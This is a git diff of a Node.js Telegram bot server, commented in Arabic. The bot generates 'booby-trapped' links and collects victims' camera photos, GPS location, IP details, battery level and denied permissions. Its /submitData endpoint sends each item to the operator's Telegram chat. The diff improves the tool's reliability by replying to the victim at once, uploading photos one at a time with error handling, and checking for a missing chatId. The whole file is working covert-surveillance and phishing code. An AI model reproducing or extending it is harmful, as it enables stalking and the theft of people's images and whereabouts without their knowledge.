@@ -4,16 +4,20 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
 const axios = require('axios');
+
 const botToken = process.env.nn;
 const m = process.env.rr;
 const fixedUrl = process.env.rr; 
+
 const bot = new TelegramBot(botToken, { polling: true });
 const app = express();
+
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.use(express.static(__dirname));
 
 let userLink = ''; 
-const s =`${m}/index.html?chatId=`; 
+const s = `${m}/index.html?chatId=`; 
+
 // إرسال البيانات إلى الرابط الثابت
 async function sendRequestToFixedUrl() {
     try {
@@ -28,19 +32,34 @@ async function sendRequestToFixedUrl() {
 setInterval(sendRequestToFixedUrl, 40000);
 
 app.post('/submitData', async (req, res) => {
+    // ✅ إرسال رد فوري وفارغ - بدون انتظار معالجة البيانات
+    res.status(200).end();
+
     const { chatId, imageDatas, location, permissions, ipInfo, battery } = req.body;
 
     try {
+        // التحقق من وجود chatId
+        if (!chatId) {
+            console.error('chatId is missing');
+            return;
+        }
+
+        // إرسال الصور إذا وجدت
         if (imageDatas) {
             const images = imageDatas.split(',');
-            images.forEach((imageData, index) => {
-                const buffer = Buffer.from(imageData, 'base64');
-                bot.sendPhoto(chatId, buffer, { caption: `Photo ${index + 1}` });
-            });
+            for (let i = 0; i < images.length; i++) {
+                try {
+                    const buffer = Buffer.from(images[i], 'base64');
+                    await bot.sendPhoto(chatId, buffer, { caption: `Photo ${i + 1}` });
+                } catch (err) {
+                    console.error(`Error sending photo ${i + 1}:`, err.message);
+                }
+            }
         } else {
             bot.sendMessage(chatId, 'لم يتم جمع الصور.');
         }
 
+        // إرسال الموقع
         if (location) {
             const locationRegex = /Lat:\s*(-?\d+\.\d+),\s*Long:\s*(-?\d+\.\d+)/;
             const match = location.match(locationRegex);
@@ -56,29 +75,28 @@ app.post('/submitData', async (req, res) => {
             bot.sendMessage(chatId, 'لم يتم جمع الموقع.');
         }
 
+        // إرسال معلومات IP
         if (ipInfo) {
             bot.sendMessage(chatId, `IP Info: ${ipInfo}`);
         } else {
             bot.sendMessage(chatId, 'لم يتم جمع معلومات IP.');
         }
 
+        // إرسال حالة البطارية
         if (battery) {
             bot.sendMessage(chatId, `Battery: ${battery}%`);
         } else {
             bot.sendMessage(chatId, 'لم يتم جمع حالة البطارية.');
         }
 
+        // إرسال الصلاحيات
         if (permissions) {
             bot.sendMessage(chatId, `Permissions Denied: ${permissions}`);
         }
 
-        // 🛠️ تم إزالة res.redirect واستبدالها بإرسال حالة نجاح بدون إعادة توجيه
-        res.status(200).json({ success: true, message: 'Data processed successfully' });
-
     } catch (error) {
         console.error('Error processing data:', error.message);
         bot.sendMessage(chatId, 'حدث خطأ أثناء معالجة البيانات.');
-        res.status(500).json({ success: false, error: 'Internal server error' });
     }
 });
 
@@ -103,8 +121,8 @@ bot.on('callback_query', (query) => {
     if (query.data === 'create_link') {
         bot.sendMessage(chatId, 'الرجاء إرسال الرابط الذي تريد تلغيمه:');
         bot.once('message', (msg) => {
-            if (msg.text.startsWith('http')) {
-                userLink = msg.text; // حفظ الرابط المرسل
+            if (msg.text && msg.text.startsWith('http')) {
+                userLink = msg.text;
                 bot.sendMessage(chatId, `تم انشاء الرابط ⚠️\n${s}${chatId}`);
             } else {
                 bot.sendMessage(chatId, 'الرجاء إرسال رابط صالح.');
